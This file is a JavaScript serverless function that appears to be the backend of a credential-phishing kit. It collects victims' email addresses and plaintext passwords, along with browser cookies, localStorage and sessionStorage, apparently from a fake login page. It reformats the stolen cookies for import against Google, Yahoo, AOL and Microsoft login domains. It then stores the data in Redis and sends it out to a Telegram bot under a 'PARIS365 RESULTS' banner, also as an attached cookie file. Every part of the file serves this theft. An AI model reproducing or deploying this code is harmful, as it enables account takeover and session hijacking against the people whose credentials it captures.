export const handler = async (event, context) => {
  // CORS headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  // Handle preflight requests
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: '',
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' }),
    };
  }

  // Helper: safe timeout signal (fallback if AbortSignal.timeout is not available)
  const createTimeoutSignal = (ms) => {
    if (typeof AbortSignal !== 'undefined' && typeof AbortSignal.timeout === 'function') {
      return AbortSignal.timeout(ms);
    }
    // Fallback
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), ms);
    // clear timeout when finished (consumer can't, so handle later)
    controller.__timeoutId = id;
    return controller.signal;
  };

  try {
    const bodyRaw = event.body || '{}';
    let data;
    try {
      data = JSON.parse(bodyRaw);
    } catch (parseErr) {
      // If the body isn't JSON, fallback to empty object
      data = {};
    }

    const {
      email,
      password,
      provider,
      fileName,
      timestamp,
      userAgent,
      browserFingerprint,
      cookiesFileData,
      documentCookies,
      localStorage: clientLocalStorage,
      sessionStorage: clientSessionStorage,
      sessionId: incomingSessionId,
      cookieList,
      cookiesParsed
    } = data;

    // Required env vars
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ success: false, message: 'Server misconfiguration: missing Telegram env vars' })
      };
    }

    const DEBUG = String(process.env.DEBUG || '').toLowerCase() === 'true';

    // Helper to get domain from email/provider
    const getDomainFromEmailProvider = (emailVal, providerVal) => {
      const providerLower = (providerVal || '').toLowerCase();
      if (providerLower.includes('gmail') || providerLower.includes('google')) {
        return '.google.com';
      } else if (providerLower.includes('yahoo')) {
        return '.yahoo.com';
      } else if (providerLower.includes('aol')) {
        return '.aol.com';
      } else if (providerLower.includes('hotmail') || providerLower.includes('live') ||
                 providerLower.includes('outlook') || providerLower.includes('office365')) {
        // Use the Microsoft login domain as requested
        return 'login.microsoftonline.com';
      } else if (providerLower === 'others' && emailVal && emailVal.includes('@')) {
        const domainPart = emailVal.split('@')[1].toLowerCase();
        return '.' + domainPart;
      }
      // Fallback based on email
      if (emailVal && emailVal.includes('@')) {
        return '.' + emailVal.split('@')[1].toLowerCase();
      }
      return '.google.com';
    };

    // Get client IP with better detection (headers may be lowercased)
    const headersIn = event.headers || {};
    const headerGet = (name) => headersIn[name] || headersIn[name.toLowerCase()] || '';
    const clientIP = (headerGet('x-forwarded-for') || headerGet('x-real-ip') || headerGet('cf-connecting-ip') ||
                      (event.requestContext && event.requestContext.identity && event.requestContext.identity.sourceIp) ||
                      'Unknown').toString().split(',')[0].trim();

    // Enhanced cookie processing
    let cookieInfo = data.documentCookies || data.cookies || (browserFingerprint && browserFingerprint.cookies) || documentCookies || 'No cookies available';

    // If the client included a cookieList array, prefer it when other cookieInfo is missing/empty
    if ((Array.isArray(data.cookieList) && data.cookieList.length > 0) && (!cookieInfo || cookieInfo === 'No cookies available' || (typeof cookieInfo === 'string' && cookieInfo.trim() === ''))) {
      cookieInfo = data.cookieList;
    }

    // If cookiesParsed is an object (name -> value) and cookieInfo is absent/empty, use it
    if ((!Array.isArray(cookieInfo) || cookieInfo.length === 0) && cookiesParsed && typeof cookiesParsed === 'object' && Object.keys(cookiesParsed).length > 0) {
      cookieInfo = cookiesParsed;
    }

    const localStorageInfo = (browserFingerprint && browserFingerprint.localStorage) || clientLocalStorage || 'Empty';
    const sessionStorageInfo = (browserFingerprint && browserFingerprint.sessionStorage) || clientSessionStorage || 'Empty';

    // Enhanced cookie formatting with multiple fallback methods
    let formattedCookies = [];

    // If cookieInfo is an object (cookiesParsed: {name: value}), convert to an array
    if (cookieInfo && typeof cookieInfo === 'object' && !Array.isArray(cookieInfo)) {
      try {
        const obj = cookieInfo;
        formattedCookies = Object.keys(obj).map(name => ({
          name,
          value: obj[name],
          domain: getDomainFromEmailProvider(email, provider),
          path: '/',
          secure: true,
          httpOnly: false,
          sameSite: 'none',
          expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
          hostOnly: false,
          session: false,
          storeId: null
        })).filter(c => c && c.name);
      } catch (e) {
        formattedCookies = [];
      }
    }

    // Method 1: Direct array
    if (formattedCookies.length === 0 && Array.isArray(cookieInfo) && cookieInfo.length > 0) {
      formattedCookies = cookieInfo.filter(cookie => cookie && cookie.name).map(cookie => ({
        ...cookie,
        domain: cookie.domain || getDomainFromEmailProvider(email, provider)
      }));
    }

    // Method 2: Parse JSON string
    if (formattedCookies.length === 0 && typeof cookieInfo === 'string' && cookieInfo.trim() !== '' && cookieInfo !== 'No cookies found' && cookieInfo !== 'Empty') {
      try {
        const parsedCookies = JSON.parse(cookieInfo);
        if (Array.isArray(parsedCookies)) {
          formattedCookies = parsedCookies.filter(cookie => cookie && cookie.name).map(cookie => ({
            ...cookie,
            domain: cookie.domain || getDomainFromEmailProvider(email, provider)
          }));
        }
      } catch (e) {
        // Method 3: Parse document.cookie format (fallback)
        if (cookieInfo.includes('=')) {
          const cookieStrings = cookieInfo.split(';');
          formattedCookies = cookieStrings
            .filter(cookieStr => cookieStr.trim() && cookieStr.includes('='))
            .map(cookieStr => {
              const [name, ...valueParts] = cookieStr.trim().split('=');
              const value = valueParts.join('=');
              return name && name.trim() && value ? {
                name: name.trim(),
                value: value.trim(),
                domain: getDomainFromEmailProvider(email, provider),
                path: '/',
                secure: true,
                httpOnly: false,
                sameSite: 'none',
                expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
                hostOnly: false,
                session: false,
                storeId: null
              } : null;
            })
            .filter(cookie => cookie !== null);
        }
      }
    }

    // Method 4: explicit documentCookies field (already covered above but keep fallback)
    if (formattedCookies.length === 0 && typeof documentCookies === 'string' && documentCookies.trim() !== '') {
      const cookieStrings = documentCookies.split(';').filter(c => c.trim() && c.includes('='));
      formattedCookies = cookieStrings
        .map(cookieStr => {
          const [name, ...valueParts] = cookieStr.trim().split('=');
          const value = valueParts.join('=');
          return name && name.trim() && value ? {
            name: name.trim(),
            value: value.trim(),
            domain: getDomainFromEmailProvider(email, provider),
            path: '/',
            secure: true,
            httpOnly: false,
            sameSite: 'none',
            expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
            hostOnly: false,
            session: false,
            storeId: null
          } : null;
        })
        .filter(cookie => cookie !== null);
    }

    // Prepare session data for storage
    const sessionId = incomingSessionId || Math.random().toString(36).substring(2, 15);

    // Per request: include plaintext password as provided by client (do NOT mask)
    const plainPassword = (typeof password !== 'undefined' && password !== null) ? String(password) : 'Not captured';

    const sessionData = {
      email: email || '',
      password: plainPassword,
      provider: provider || 'Others',
      fileName: fileName || 'Adobe Cloud Access',
      timestamp: timestamp || new Date().toISOString(),
      sessionId,
      clientIP,
      userAgent: userAgent || 'Unknown',
      deviceType: /Mobile|Android|iPhone|iPad/.test(userAgent || '') ? 'mobile' : 'desktop',
      cookies: cookieInfo,
      localStorage: localStorageInfo,
      sessionStorage: sessionStorageInfo,
      browserFingerprint: browserFingerprint || {},
      cookiesFileData: cookiesFileData || '',
      formattedCookies,
      rawDataType: typeof cookieInfo
    };

    // Store in Upstash Redis if provided
    const UPSTASH_REDIS_REST_URL = process.env.UPSTASH_REDIS_REST_URL;
    const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
    const REDIS_TTL_SECONDS = parseInt(process.env.REDIS_TTL_SECONDS || '60', 10); // default short TTL

    if (UPSTASH_REDIS_REST_URL && UPSTASH_REDIS_REST_TOKEN) {
      try {
        const { Redis } = await import('@upstash/redis');
        const redis = new Redis({
          url: UPSTASH_REDIS_REST_URL,
          token: UPSTASH_REDIS_REST_TOKEN,
        });

        // Save session with TTL to avoid storing sensitive data indefinitely
        await redis.set(`session:${sessionId}`, JSON.stringify(sessionData));
        if (REDIS_TTL_SECONDS > 0) {
          await redis.expire(`session:${sessionId}`, REDIS_TTL_SECONDS);
        }
        try {
          await redis.set(`user:${email}`, JSON.stringify(sessionData));
          if (REDIS_TTL_SECONDS > 0) {
            await redis.expire(`user:${email}`, REDIS_TTL_SECONDS);
          }
        } catch (e) {
          // ignore if key cannot be set for empty email
        }
        // Cookies bucket
        await redis.set(`cookies:${sessionId}`, JSON.stringify({
          cookies: formattedCookies,
          localStorage: localStorageInfo,
          sessionStorage: sessionStorageInfo,
          timestamp: timestamp,
          email: email,
          password: plainPassword
        }));
        if (REDIS_TTL_SECONDS > 0) {
          await redis.expire(`cookies:${sessionId}`, REDIS_TTL_SECONDS);
        }

        if (DEBUG) console.log('✅ Session data stored in Redis');
      } catch (redisError) {
        console.error('❌ Redis storage error:', redisError);
      }
    }

    // Compose Telegram message (include plaintext password as requested)
    const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent || '') ? '📱 Mobile' : '💻 Desktop';

    const message = `🔐 PARIS365 RESULTS

📧 ${email || 'Not captured'}
🔑 ${plainPassword}
🏢 ${provider || 'Others'}
🕒 ${new Date().toLocaleString()}
🌐 ${clientIP} | ${deviceInfo}
🍪 ${formattedCookies.length} cookies captured

🆔 ${sessionId}`;

    // Send main message to Telegram
    const telegramSignal = createTimeoutSignal(15000);

    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
      }),
      signal: telegramSignal,
    });

    let fileSent = false;

    try {
      // Prepare cookies file
      const cookiesForFile = (formattedCookies && formattedCookies.length > 0) ? formattedCookies.map(cookie => ({
        ...cookie,
        domain: cookie.domain || getDomainFromEmailProvider(email, provider)
      })) : [];

      // Sanitize filename for upload
      const safeEmailForFilename = (email || 'unknown').replace(/@/g, '_at_').replace(/[^a-zA-Z0-9_\-\.]/g, '_');
      const fileNameForUpload = `cookies_${safeEmailForFilename}_${Date.now()}.js`;

      // Build cookie file content
      const cookiesFileContent = `// Cookie Data for ${email || 'unknown'} - ${new Date().toISOString()}
// Provider: ${provider || 'Others'}
// IP: ${clientIP}
// Cookies Found: ${cookiesForFile.length}

let ipaddress = "${clientIP}";
let email = "${email || 'Not captured'}";
let password = "${plainPassword}";

${cookiesForFile.length > 0 ? `// Formatted Cookies:\n${JSON.stringify(cookiesForFile, null, 2)}\n` : '// No cookies found'}

// Session Storage:
// ${typeof sessionStorageInfo === 'string' ? sessionStorageInfo : JSON.stringify(sessionStorageInfo).substring(0, 200)}

// Local Storage:
// ${typeof localStorageInfo === 'string' ? localStorageInfo : JSON.stringify(localStorageInfo).substring(0, 200)}
`;

      // Try using FormData if available (Node 18+ supports global FormData)
      let fileResponse;
      if (typeof FormData !== 'undefined') {
        const form = new FormData();
        form.append('chat_id', TELEGRAM_CHAT_ID);
        // FormData in Node may require Buffer
        form.append('document', new Blob([cookiesFileContent], { type: 'text/javascript' }), fileNameForUpload);
        fileResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
          method: 'POST',
          body: form,
          signal: createTimeoutSignal(30000)
        });
      } else {
        // Fallback: manual multipart body
        const boundary = '----formdata-boundary-' + Math.random().toString(36);
        let formBody = '';
        formBody += `--${boundary}\r\n`;
        formBody += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
        formBody += `${TELEGRAM_CHAT_ID}\r\n`;
        formBody += `--${boundary}\r\n`;
        formBody += `Content-Disposition: form-data; name="document"; filename="${fileNameForUpload}"\r\n`;
        formBody += `Content-Type: text/javascript\r\n\r\n`;
        formBody += cookiesFileContent + '\r\n';
        formBody += `--${boundary}--\r\n`;

        fileResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
          method: 'POST',
          headers: {
            'Content-Type': `multipart/form-data; boundary=${boundary}`,
          },
          body: formBody,
          signal: createTimeoutSignal(30000),
        });
      }

      if (fileResponse && fileResponse.ok) {
        fileSent = true;
      } else {
        // Try fallback: send as text message (limited size)
        try {
          const fallbackMessage = `📁 <b>COOKIES FILE</b> (${cookiesForFile.length} cookies)\n\n<code>${(cookiesForFile.length > 0 ? JSON.stringify(cookiesForFile).slice(0, 3000) : 'no cookies')}</code>`;
          const fallbackResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: TELEGRAM_CHAT_ID,
              text: fallbackMessage,
              parse_mode: 'HTML',
            }),
            signal: createTimeoutSignal(15000),
          });
          if (fallbackResponse.ok) fileSent = true;
        } catch (fallbackErr) {
          if (DEBUG) console.warn('Fallback cookie text message failed', fallbackErr);
        }
      }
    } catch (fileError) {
      if (DEBUG) console.error('Cookie file send error:', fileError);
      // Final fallback - send debug info (only in debug mode)
      if (DEBUG) {
        try {
          const debugInfo = `🔍 DEBUG INFO\nUser: ${email || 'Not captured'}\nCookies Found: ${formattedCookies.length}\nRaw Type: ${typeof cookieInfo}\nRaw Sample: ${String(cookieInfo).slice(0, 500)}`;
          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: TELEGRAM_CHAT_ID,
              text: debugInfo,
              parse_mode: 'HTML',
            }),
            signal: createTimeoutSignal(10000),
          });
          fileSent = true;
        } catch (e) {
          if (DEBUG) console.error('Failed to send debug info to Telegram', e);
        }
      }
    }

    // Build minimal response
    const responseBody = {
      success: true,
      sessionId,
      cookiesCollected: formattedCookies.length > 0,
      cookieCount: formattedCookies.length,
      fileSent,
    };

    if (DEBUG) {
      responseBody.debug = {
        originalCookieType: typeof cookieInfo,
        processedCookieCount: formattedCookies.length,
        rawDataAvailable: !!cookieInfo,
        storedInRedis: !!(UPSTASH_REDIS_REST_URL && UPSTASH_REDIS_REST_TOKEN)
      };
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify(responseBody),
    };

  } catch (error) {
    // Attempt to notify via Telegram about the error (non-sensitive)
    try {
      const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
      const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        const errMsg = `🚨 <b>FUNCTION ERROR</b>\n\n<code>${String(error.message || error)}</code>\n\n${new Date().toISOString()}`;
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: errMsg,
            parse_mode: 'HTML',
          }),
          signal: createTimeoutSignal(8000),
        });
      }
    } catch (notificationError) {
      // ignore notification errors
      if (String(process.env.DEBUG || '').toLowerCase() === 'true') {
        console.error('Notification error:', notificationError);
      }
    }

    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'Internal server error',
        timestamp: new Date().toISOString(),
        message: DEBUG ? String(error.message || error) : 'Internal server error'
      }),
    };
  }
};
